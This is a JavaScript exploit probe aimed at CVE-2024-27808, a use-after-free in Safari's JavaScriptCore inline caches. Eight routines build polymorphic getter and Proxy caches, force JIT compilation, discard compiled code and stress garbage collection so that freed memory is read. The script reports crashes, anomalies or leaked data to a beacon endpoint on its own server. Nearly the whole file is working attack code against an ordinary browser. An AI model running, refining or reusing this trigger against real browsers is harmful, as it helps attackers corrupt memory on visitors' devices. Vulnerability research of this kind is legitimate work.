/* p108 — CVE-2024-27808: AccessCase CallLinkInfo Use-After-Free
 *
 * THE BUG (Bug 268221, fixed Safari 17.5):
 * AccessCase stores a raw CallLinkInfo* for Getter/Setter/Proxy IC entries.
 * The CallLinkInfo lives on the JITStubRoutine. When CodeBlock destruction
 * is delayed (deferred by GC), the JITStubRoutine can be destroyed while
 * AccessCase still holds the raw pointer. GC weak-visiting then dereferences
 * freed memory.
 *
 * TRIGGER STRATEGY:
 * 1. Create objects with getters that force polymorphic inline caches
 * 2. Create Proxy objects that force ProxyObjectAccessCase with CallLinkInfo
 * 3. Warm up to DFG tier (forces IC compilation with AccessCase entries)
 * 4. Null out references to force CodeBlock/JITStubRoutine collection
 * 5. Spam GC to trigger weak-visiting of the dangling CallLinkInfo*
 * 6. Detect crash, corruption, or leaked data
 *
 * Beacon prefix: V108L-
 */
(function(){
var RUN_ID = "v108l" + Math.random().toString(36).slice(2,12);
var PREFIX = "V108L-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press108-accesscase-uaf");

/* ====== L1: Getter IC polymorphism + CodeBlock churn ====== */
function test_L1() {
  var r = {};
  try {
    function makeObjWithGetter(n) {
      var o = {};
      Object.defineProperty(o, 'val', {
        get: function() { return n; },
        configurable: true
      });
      return o;
    }

    var objs = [];
    for (var i = 0; i < 32; i++) {
      objs.push(makeObjWithGetter(i));
    }

    function readVal(o) { return o.val; }

    for (var i = 0; i < 50000; i++) {
      readVal(objs[i % 32]);
    }
    r.warmupDone = true;

    var fns = [];
    for (var round = 0; round < 20; round++) {
      var fn = new Function('objs', 'n',
        'var sum = 0;' +
        'for (var i = 0; i < n; i++) sum += objs[i % 32].val;' +
        'return sum;'
      );
      for (var i = 0; i < 5000; i++) fn(objs, 5000);
      fns.push(fn);
    }
    r.fnsCreated = fns.length;

    for (var i = 0; i < fns.length - 1; i++) fns[i] = null;
    r.nulled = true;

    var garbage = [];
    for (var i = 0; i < 200; i++) {
      garbage.push(new ArrayBuffer(65536));
      if (i % 20 === 0) garbage = [];
    }
    r.gcPressureDone = true;

    var lastResult = fns[fns.length - 1](objs, 5000);
    r.lastResult = lastResult;
    r.expectedSum = (4999 * 5000 / 2) % 32;
    r.SURVIVED = true;
    B("L1-GETTER-IC", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L1-ERR", r); }
}

/* ====== L2: Proxy IC + GC stress ====== */
function test_L2() {
  var r = {};
  try {
    var callCount = 0;
    var handler = {
      get: function(target, prop) {
        callCount++;
        return target[prop];
      }
    };

    function makeProxy(n) {
      return new Proxy({val: n, type: 'proxy'}, handler);
    }

    var proxies = [];
    for (var i = 0; i < 16; i++) proxies.push(makeProxy(i));

    var plainObjs = [];
    for (var i = 0; i < 16; i++) plainObjs.push({val: i + 100, type: 'plain'});

    var mixed = [];
    for (var i = 0; i < 16; i++) {
      mixed.push(proxies[i]);
      mixed.push(plainObjs[i]);
    }

    function polyRead(o) { return o.val; }

    for (var i = 0; i < 100000; i++) {
      polyRead(mixed[i % 32]);
    }
    r.warmupDone = true;
    r.callCount1 = callCount;

    var fnCache = [];
    for (var round = 0; round < 30; round++) {
      callCount = 0;
      var fn = new Function('mixed',
        'var s = 0;' +
        'for (var i = 0; i < 10000; i++) s += mixed[i % 32].val;' +
        'return s;'
      );
      var res = fn(mixed);
      fnCache.push({fn: fn, res: res, cc: callCount});
    }
    r.fnsCreated = fnCache.length;

    var savedFn = fnCache[fnCache.length - 1].fn;
    var savedCC = fnCache[fnCache.length - 1].cc;
    for (var i = 0; i < fnCache.length - 1; i++) {
      fnCache[i].fn = null;
      fnCache[i] = null;
    }
    r.nulledCodeBlocks = true;

    var garbage = [];
    for (var pass = 0; pass < 5; pass++) {
      for (var i = 0; i < 100; i++) {
        garbage.push(new ArrayBuffer(131072));
      }
      garbage = [];
      callCount = 0;
      var checkResult = savedFn(mixed);
      r['pass' + pass + '_result'] = checkResult;
      r['pass' + pass + '_cc'] = callCount;
    }

    r.SURVIVED = true;
    B("L2-PROXY-IC", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L2-ERR", r); }
}

/* ====== L3: GetterSetter AccessCase + structure transition during GC ====== */
function test_L3() {
  var r = {};
  try {
    function ClassA(n) { this._n = n; }
    Object.defineProperty(ClassA.prototype, 'value', {
      get: function() { return this._n * 2; }
    });

    function ClassB(n) { this._n = n; this._extra = 'b'; }
    Object.defineProperty(ClassB.prototype, 'value', {
      get: function() { return this._n * 3; }
    });

    function ClassC(n) { this._n = n; this._x = 1; this._y = 2; }
    Object.defineProperty(ClassC.prototype, 'value', {
      get: function() { return this._n * 5; }
    });

    var pool = [];
    for (var i = 0; i < 100; i++) {
      if (i % 3 === 0) pool.push(new ClassA(i));
      else if (i % 3 === 1) pool.push(new ClassB(i));
      else pool.push(new ClassC(i));
    }

    function getValue(obj) { return obj.value; }

    for (var i = 0; i < 200000; i++) {
      getValue(pool[i % 100]);
    }
    r.warmupDone = true;

    var weakTargets = [];
    for (var round = 0; round < 50; round++) {
      var fn = new Function('pool',
        'var s = 0;' +
        'for (var i = 0; i < 10000; i++) s += pool[i % 100].value;' +
        'return s;'
      );
      fn(pool);
      weakTargets.push(fn);
    }
    r.codeBlocksCreated = weakTargets.length;

    for (var i = 0; i < weakTargets.length; i++) weakTargets[i] = null;
    weakTargets = null;

    var junk = [];
    for (var i = 0; i < 500; i++) {
      junk.push(new ArrayBuffer(65536));
      if (i % 50 === 0) {
        junk = [];
        var check = getValue(pool[0]);
        if (check !== 0) {
          r.anomalyAt = i;
          r.anomalyVal = check;
        }
      }
    }
    r.gcStressDone = true;

    var finalCheck = getValue(pool[1]);
    r.finalCheck = finalCheck;
    r.expected = 3;
    r.match = (finalCheck === 3);
    r.SURVIVED = true;
    B("L3-GETTERSETTER", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L3-ERR", r); }
}

/* ====== L4: Proxy + valueOf chain — complex CallLinkInfo paths ====== */
function test_L4() {
  var r = {};
  try {
    function makeDeepProxy(depth) {
      var base = {
        valueOf: function() { return 42; },
        toString: function() { return "proxy"; }
      };
      var p = base;
      for (var i = 0; i < depth; i++) {
        p = new Proxy(p, {
          get: function(t, prop) {
            if (prop === 'valueOf' || prop === 'toString') return t[prop];
            return Reflect.get(t, prop);
          }
        });
      }
      return p;
    }

    var proxies = [];
    for (var i = 1; i <= 8; i++) proxies.push(makeDeepProxy(i));

    function coerceAdd(a, b) { return a + b; }

    for (var i = 0; i < 100000; i++) {
      coerceAdd(proxies[i % 8], i);
    }
    r.warmupDone = true;

    var codeBlocks = [];
    for (var round = 0; round < 40; round++) {
      var fn = new Function('proxies',
        'var s = 0;' +
        'for (var i = 0; i < 5000; i++) s += proxies[i % 8] + 0;' +
        'return s;'
      );
      fn(proxies);
      codeBlocks.push(fn);
    }
    r.fnsCreated = codeBlocks.length;

    for (var i = 0; i < codeBlocks.length; i++) codeBlocks[i] = null;
    codeBlocks = null;

    for (var i = 0; i < 300; i++) {
      new ArrayBuffer(131072);
    }
    r.gcDone = true;

    var finalResult = coerceAdd(proxies[0], 0);
    r.finalResult = finalResult;
    r.expected = 42;
    r.match = (finalResult === 42);

    r.SURVIVED = true;
    B("L4-PROXYCHAIN", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L4-ERR", r); }
}

/* ====== L5: Worker + main thread IC desync ====== */
function test_L5() {
  var r = {};
  try {
    var workerCode = 'onmessage = function(e) {' +
      'var objs = [];' +
      'for (var i = 0; i < 16; i++) {' +
      '  var o = {};' +
      '  Object.defineProperty(o, "val", {get: function() { return 999; }});' +
      '  objs.push(o);' +
      '}' +
      'function readMany(arr) { var s = 0; for (var i = 0; i < 50000; i++) s += arr[i%16].val; return s; }' +
      'for (var r = 0; r < 20; r++) {' +
      '  var fn = new Function("arr", "var s=0; for(var i=0;i<5000;i++) s+=arr[i%16].val; return s;");' +
      '  fn(objs);' +
      '  fn = null;' +
      '}' +
      'for (var i = 0; i < 200; i++) new ArrayBuffer(65536);' +
      'var final = readMany(objs);' +
      'postMessage({final: final, survived: true});' +
      '};';

    var blob = new Blob([workerCode], {type: 'application/javascript'});
    var url = URL.createObjectURL(blob);
    var w = new Worker(url);

    var timeout = setTimeout(function() {
      r.TIMEOUT = true;
      B("L5-TIMEOUT", r);
    }, 15000);

    w.onmessage = function(e) {
      clearTimeout(timeout);
      r.workerResult = e.data;
      r.SURVIVED = true;
      B("L5-WORKER-IC", r);
    };

    w.onerror = function(e) {
      clearTimeout(timeout);
      r.workerError = e.message ? e.message.slice(0, 80) : "unknown";
      B("L5-WORKER-ERR", r);
    };

    w.postMessage("go");
    r.workerStarted = true;
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L5-ERR", r); }
}

/* ====== L6: Rapid CodeBlock creation/destruction with getter IC ====== */
function test_L6() {
  var r = {};
  try {
    var sentinel = {};
    var observations = [];

    function ClassD() { this._live = true; }
    Object.defineProperty(ClassD.prototype, 'check', {
      get: function() { return this._live ? sentinel : null; }
    });

    var targets = [];
    for (var i = 0; i < 20; i++) targets.push(new ClassD());

    for (var burst = 0; burst < 100; burst++) {
      var fn = new Function('targets', 'sentinel',
        'for (var i = 0; i < 2000; i++) {' +
        '  var t = targets[i % 20];' +
        '  var v = t.check;' +
        '  if (v !== sentinel) return {burst: ' + burst + ', i: i, v: typeof v, raw: String(v).slice(0,30)};' +
        '}' +
        'return null;'
      );

      var anomaly = fn(targets, sentinel);
      if (anomaly) {
        r.ANOMALY = true;
        r.anomaly = anomaly;
        B("L6-ANOMALY", r);
        break;
      }
      fn = null;

      if (burst % 10 === 0) {
        for (var j = 0; j < 20; j++) new ArrayBuffer(65536);
      }
    }

    r.bursts = burst >= 100 ? 100 : burst;
    r.SURVIVED = true;
    B("L6-BURST", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L6-ERR", r); }
}

/* ====== L7: Interleaved Proxy/Getter with eval-based CodeBlock churn ====== */
function test_L7() {
  var r = {};
  try {
    var proxyHandler = {
      get: function(t, p) { return t[p]; }
    };

    var objects = [];
    for (var i = 0; i < 10; i++) {
      var plain = {x: i};
      Object.defineProperty(plain, 'y', {get: function() { return this.x * 7; }});
      objects.push(plain);
      objects.push(new Proxy({x: i + 100, y: (i+100)*7}, proxyHandler));
    }

    function polyAccess(o) { return o.y; }

    for (var i = 0; i < 200000; i++) {
      polyAccess(objects[i % 20]);
    }
    r.warmupDone = true;

    for (var cycle = 0; cycle < 50; cycle++) {
      var code = '(function(objects) { var s = 0; for (var i = 0; i < 5000; i++) s += objects[i % 20].y; return s; })';
      var fn = eval(code);
      var res = fn(objects);

      fn = null;
      code = null;

      if (cycle % 5 === 0) {
        for (var j = 0; j < 30; j++) new ArrayBuffer(65536);
      }
    }
    r.cycles = 50;

    var finalCheck = polyAccess(objects[1]);
    r.finalCheck = finalCheck;
    r.expectedProxy = 707;

    r.SURVIVED = true;
    B("L7-EVAL-CHURN", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L7-ERR", r); }
}

/* ====== L8: Extreme — rapid IC polymorphism + GC + structure transition ====== */
function test_L8() {
  var r = {};
  try {
    var shapes = [];
    for (var i = 0; i < 64; i++) {
      var o = {};
      for (var j = 0; j < i; j++) o['pad' + j] = j;
      Object.defineProperty(o, 'target', {
        get: (function(idx) { return function() { return idx; }; })(i)
      });
      shapes.push(o);
    }

    function megamorph(o) { return o.target; }

    for (var i = 0; i < 300000; i++) {
      megamorph(shapes[i % 64]);
    }
    r.megamorphDone = true;

    for (var wave = 0; wave < 30; wave++) {
      var fn = new Function('shapes',
        'var s = 0;' +
        'for (var i = 0; i < 10000; i++) s += shapes[i % 64].target;' +
        'return s;'
      );
      fn(shapes);
      fn = null;

      for (var k = 0; k < 50; k++) new ArrayBuffer(65536);
    }
    r.waves = 30;

    var check = megamorph(shapes[7]);
    r.check = check;
    r.expected = 7;
    r.match = (check === 7);

    r.SURVIVED = true;
    B("L8-MEGAMORPH", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,80); B("L8-ERR", r); }
}

/* ====== Run ====== */
try {
  test_L1();
  setTimeout(test_L2, 3000);
  setTimeout(test_L3, 10000);
  setTimeout(test_L4, 18000);
  setTimeout(test_L5, 25000);
  setTimeout(test_L6, 35000);
  setTimeout(test_L7, 45000);
  setTimeout(test_L8, 55000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 5000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe108-done"); }, 100000);
})();
